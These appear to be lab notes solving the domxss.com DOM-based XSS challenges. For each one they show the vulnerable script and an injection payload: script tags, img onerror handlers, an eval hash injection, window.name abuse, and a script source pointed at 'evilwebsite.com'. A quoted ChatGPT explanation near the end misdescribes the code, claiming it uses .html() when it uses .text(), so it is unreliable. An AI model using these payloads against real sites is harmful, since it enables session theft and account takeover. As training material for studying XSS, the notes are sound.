
---

# simple_noHead

> This is a very classic html injection, you actually need to inject a script and call d00med()

![[Pasted image 20241222003750.png]]

```js
<script>
var pos=document.URL.indexOf("name=")+5;
var username = unescape(document.URL.substring(pos,document.URL.length));
var r='<b>'+username+'</b>'
document.write(r);
</script>
```

payload
```js
<script>d00med()</script>
```

![[Pasted image 20241222004037.png]]

# simplesst_1
---
> This is a very classic html injection, you actually need to inject a script and call d00med()

![[Pasted image 20241222004300.png]]

```js
var pos=document.URL.indexOf("name=")+5;
var username = unescape(document.URL.substring(pos,document.URL.length));
var m='<b>'+username+'</b>'
document.write(m);
```

payload
```js
<script>d00med()</script>
```

![[Pasted image 20241222004355.png]]


# simplest_2
---
> This is a very classic html injection. In this case script tag won't work and call d00med()

![[Pasted image 20241222004516.png]]

```js
var url=unescape(document.URL);
var pos=url.indexOf("name=")+5;
document.getElementById("user").innerHTML="Hi, <b>"+url.substring(pos,url.length)+'</b>';
console.log("in")
```

payload
```js
<img src=x onerror=d00med()>
```


![[Pasted image 20241222004640.png]]

# eval
---
> DOMinatorPro will show an alert since it controls since it take trace of the operations performed on tainted sources.


```js
function loadObj(){
 var cc=eval('('+unescape(aMess)+')');
 document.getElementById('mess').textContent=cc.message;
}
if(window.location.hash.indexOf('message')==-1)
  var aMess="({\"message\":\"Hello User!\"})";
else
  var aMess=location.hash.substr(window.location.hash.indexOf('message=')+8);
```

- use message param in the URL 

payload
```js
#message=d00med()
```

![[Pasted image 20241222005237.png]]

# script_src
---
> The attacker can control a url which is used to load a script.

Not much in the home page
![[Pasted image 20241222014111.png]]
Looking at the source
```js
 var d=document.createElement("script");
 if(location.hash.slice(1))
 d.src =  location.hash.slice(1);
 (function(){
  var a=document.createElement("a");
  a.href=d.src;
  if(a.host!="" && a.host.indexOf(location.host)!=0){
    d00med();
   }
 })();
 document.body.appendChild(d);
```

- we just to pass the if statement and the d00med() function will be called
- `a.host` shouldn't be an empty string and `location.host` shouldn't  match `a.host`
- `var d=document.createElement("script");` is creating a `script` element
- if statement checks for # in the URL and if it is present and there is a value after # in the URL this assigns that value to the `src` attribute of the newly created `<script>` element.
- In the function below `a.href` takes value of `d.src` which will be our input after # in URL

payload
`http://evilwebsite.com`

![[Pasted image 20241222010427.png]]

# jquery_html
---
> Use DOMinatorPro/BCDetect to identify the issues and try to execute the function d00med()

![[Pasted image 20241222010958.png]]

clicking those links
![[Pasted image 20241222010902.png]]

page source
```js
function setMessage(){
 var t=unescape(location.hash.slice(1));
 $("div[id="+t+"]").html("Message from the name "+window.name);
}
$(document).ready(setMessage  );
$(window).bind("hashchange",setMessage)
```

- Since `window.name` is not sanitized we can directly inject malicious JS into window.name which the browser will read and execute every time those `Show Here` links are clicked

Test case with `window.name` set to a random string
![[Pasted image 20241222011606.png]]

payload
```js
// in developer console
window.name = "<img src=x onerror=d00med()>"
```
- Add the above payload in developer console
- click the `Show Here` links 
![[Pasted image 20241222011725.png]]

# jquery_old_html
---
> To identify the issues and try to execute the function d00med()

![[Pasted image 20241222011810.png]]

clicking the links

![[Pasted image 20241222011836.png]]

page source
```js
function setMessage(){
 var t=unescape(location.hash.slice(1));
 $("div[id="+t+"]").text("The DOM is now loaded and can be manipulated.");
}
$(document).ready(setMessage  );
$(window).bind("hashchange",setMessage)

```

payload
```js
// <script>d00med()</script> didn't work, then I tried the below paylaod
#<img src=x onerror=d00med()>
```

![[Pasted image 20241222013406.png]]

Unsure if my solution was right, I asked chatgpt to verify and here is what it said.
### What Your Input Does:

Your input URL is:

`http://www.domxss.com/domxss/01_Basics/06_jquery_old_html.html?1460831301#%3Cimg%20src=x%20onerror=d00med()%3E`

1. **Hash Value Extraction**:
	- `location.hash` becomes:
        `#%3Cimg%20src=x%20onerror=d00med()%3E`
        
    - After `slice(1)` to remove the `#`, it becomes:
        `%3Cimg%20src=x%20onerror=d00med()%3E`
        
    - `unescape()` decodes the URL-encoded string:
        `<img src=x onerror=d00med()>`
        
2. **jQuery Selector**:
    - The extracted hash value is directly passed into the jQuery selector:
        `$("div[id=<img src=x onerror=d00med()>]").html("The DOM is now loaded and can be manipulated.");`
        
    - This creates a new `<div>` element with the `id` `<img src=x onerror=d00med()>`.

3. **`html()` Method**:
    
    - The `.html()` method sets the HTML content of the target `div`. However, because the `id` includes an injected `<img>` tag with an `onerror` attribute, the browser executes the `onerror` handler (`d00med()`).

4. **Execution of `d00med()`**:
    
    - When the browser parses the `id` value as an `<img>` tag, the `onerror` event triggers and calls `d00med()`.

### Why This Is Correct:

- The code is vulnerable because:
    - The `location.hash` is unsanitized.
    - The `html()` method executes any HTML or JavaScript contained within the hash.
- By injecting a malicious `onerror` attribute, you successfully execute `d00med()`.